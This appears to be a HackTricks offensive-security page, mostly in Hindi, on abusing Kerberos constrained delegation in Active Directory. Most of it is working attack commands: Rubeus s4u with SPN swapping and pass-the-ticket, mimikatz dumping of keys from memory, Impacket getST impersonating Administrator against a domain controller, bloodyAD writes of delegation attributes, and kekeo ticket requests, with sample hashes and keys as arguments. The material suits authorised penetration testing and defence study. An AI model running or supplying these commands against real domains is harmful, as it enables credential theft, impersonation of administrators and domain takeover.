# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

इसका उपयोग करके Domain admin किसी computer को किसी machine की किसी भी **service** के विरुद्ध **user या computer का impersonate करने की अनुमति** दे सकता है।

- **Service for User to self (_S4U2self_):** कोई भी **service account, जो SPN own करता है,** आमतौर पर किसी arbitrary user की ओर से स्वयं को TGS प्राप्त कर सकता है। यदि उस account के _userAccountControl_ में [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) भी है, तो वह TGS **forwardable** होता है। यही चीज़ protocol transition को **classic constrained delegation** के लिए सीधे उपयोगी बनाती है।
- **Service for User to Proxy(_S4U2proxy_):** कोई **service account**, **msDS-AllowedToDelegateTo** में सूचीबद्ध SPNs के लिए किसी user की ओर से TGS प्राप्त कर सकता है। S4U2Proxy में उपयोग किया गया evidence ticket delegating service के लिए **forwardable** ticket होना चाहिए: या तो victim से capture किया गया वास्तविक client-to-service ticket, या **S4U2Self + T2A4D** से बनाया गया ticket।

**Note**: यदि AD में किसी user को ‘_Account is sensitive and cannot be delegated_’ के रूप में चिह्नित किया गया है, या वह **Protected Users** का member है, तो आप आमतौर पर constrained delegation के माध्यम से उसका **impersonate नहीं कर पाएंगे**। Modern domains में delegation-enabled accounts को target करते समय RC4-only assumptions के बजाय **AES** material को प्राथमिकता दें।

इसका अर्थ है कि यदि आप **service का hash compromise** कर लेते हैं, तो आप **users का impersonate** कर सकते हैं और indicated machines पर किसी भी **service** तक उनकी ओर से **access** प्राप्त कर सकते हैं, जिससे संभावित **privesc** हो सकता है।

इसके अलावा, आपके पास केवल उस service का access नहीं होगा जिसे user impersonate कर सकता है, बल्कि **किसी भी service का access** होगा, क्योंकि SPN (requested service name) को check नहीं किया जाता (ticket में यह भाग encrypted/signed नहीं होता)। इसलिए, यदि आपके पास **CIFS service** का access है, तो आप उदाहरण के लिए Rubeus में `/altservice` flag का उपयोग करके **HOST service** का access भी प्राप्त कर सकते हैं। इसी SPN swapping weakness का उपयोग **Impacket getST -altservice** और अन्य tooling द्वारा भी किया जाता है।

इसके अलावा, **DC पर LDAP service access** ही **DCSync** exploit करने के लिए आवश्यक है।
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Operator note:** **gMSA/sMSA** की समीक्षा के लिए केवल **ADUC** या BloodHound के screenshots पर भरोसा न करें। इन accounts में अक्सर सामान्य Delegation tab छिपा होता है, इसलिए raw **`userAccountControl`** और **`msDS-AllowedToDelegateTo`** attributes को सीधे enumerate करें।
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition बनाम Kerberos-only constrained delegation

यदि compromised account के पास **T2A4D** है, तो आप आमतौर पर केवल service key/TGT से पूरी **`S4U2Self -> S4U2Proxy`** chain पूरी कर सकते हैं।<sup>[[2]](#references)</sup>

यदि उसके पास केवल **`msDS-AllowedToDelegateTo`** है (classic **"Use Kerberos only"** mode), तो delegation का अभी भी abusable होना संभव है, लेकिन S4U2Proxy के लिए evidence ticket delegating service के लिए एक **वास्तविक forwardable user-to-service ticket** होना चाहिए। व्यवहार में इसका अर्थ है victim TGS को **LSASS/ccache** से चुराना या capture करना और उसे दूसरे stage (`/tgs:` in Rubeus) में feed करना। एक **non-forwardable** S4U2Self ticket classic constrained delegation के लिए पर्याप्त **नहीं** है; यदि आपके पास यही एकमात्र evidence ticket है, तो इसके बजाय [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) देखें।<sup>[[2]](#references)</sup>

### Cross-domain constrained delegation notes (2025+)

**Windows Server 2012/2012 R2** से KDC, S4U2Proxy extensions के माध्यम से **domains/forests के बीच constrained delegation** को support करता है। Modern builds (Windows Server 2016–2025) इस behaviour को बनाए रखते हैं और protocol transition का संकेत देने के लिए दो PAC SIDs जोड़ते हैं:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) जब user ने सामान्य रूप से authenticate किया हो।
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) जब किसी service ने protocol transition के माध्यम से identity assert की हो।

जब domains के बीच protocol transition का उपयोग किया जाता है, तो PAC के अंदर `SERVICE_ASSERTED_IDENTITY` मिलने की अपेक्षा करें; यह पुष्टि करता है कि S4U2Proxy step सफल हुआ।<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

Recent Impacket (0.11.x+) Rubeus की तरह ही S4U chain और SPN swapping expose करता है:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
यदि आप पहले user ST forge करना पसंद करते हैं (जैसे, केवल offline hash उपलब्ध हो), तो S4U2Proxy के लिए **ticketer.py** को **getST.py** के साथ उपयोग करें। जब आपके पास पहले से working ccache हो और उसी host के लिए केवल service class बदलनी हो, तब **tgssub.py** भी उपयोगी है। मौजूदा quirks के लिए open Impacket issue #1713 देखें (जब forged ST, SPN key से match नहीं करता तो KRB_AP_ERR_MODIFIED)।<sup>[[2]](#references)</sup>

### कम-priv credentials से delegation setup को automate करना

यदि आपके पास पहले से किसी computer या service account पर **GenericAll/WriteDACL** है, तो आप **bloodyAD** (2024+) का उपयोग करके RSAT के बिना आवश्यक attributes को remotely push कर सकते हैं:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
यह आपको उन attributes को write करने में सक्षम होते ही DA privileges के बिना privesc के लिए constrained delegation path बनाने देता है।

- Step 1: **allowed service का TGT प्राप्त करें**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> **TGT ticket** प्राप्त करने या कंप्यूटर में SYSTEM हुए बिना **RC4** या **AES256** प्राप्त करने के **अन्य तरीके** भी हैं, जैसे Printer Bug और unconstrain delegation, NTLM relaying और Active Directory Certificate Service abuse
>
> **केवल वह TGT ticket (या hashed) होने पर, आप पूरे कंप्यूटर को compromise किए बिना यह attack कर सकते हैं।**

- Step2: **user का impersonation करते हुए service के लिए TGS प्राप्त करें**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**ired.team में अधिक जानकारी।**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) और [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Kerberos Constrained Delegation का अवलोकन (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Impacket के साथ Delegation का दुरुपयोग (भाग 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity ने Domain को समाप्त कर दिया: एक Offensive Kerberos Overview (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
{{#include ../../banners/hacktricks-training.md}}
